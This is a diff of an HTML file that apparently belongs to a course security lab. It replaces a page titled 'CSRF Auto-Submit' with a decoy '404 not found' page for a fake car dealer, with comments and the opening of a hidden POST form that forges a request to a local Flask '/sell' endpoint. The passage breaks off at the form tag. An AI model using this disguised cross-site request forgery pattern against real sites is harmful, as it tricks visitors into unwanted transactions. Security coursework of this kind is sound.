@@ -1,7 +1,41 @@
-<!doctype html>
-<html>
-  <body>
-    <h3>CSRF Auto-Submit</h3>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Totally Normal Website</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+            width: 100%;
+            height: 50px;
+            background: #3e0101;
+            color: azure;
+            font-size: 40px;
+            line-height: 50px;
+            padding-left: 10px;
+        }
+
+        .pl {
+            padding-left: 10px;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        Cars 5 U (Totally legit)
+    </header>
+    <div class="pl">
+        <h1>Totally normal 404 not found</h1>
+        <p>Sorry! We could not find what you were looking for. Try again soon.</p>
+    </div>
+</body>
+
     <!-- Posts cross-site to our Flask /sell -->
      <!-- !!! Replace with server IP in CCSEP chat. Actual IP omitted for GitHub -->
     <form action="http://localhost:5000/sell" method="POST" id="f">
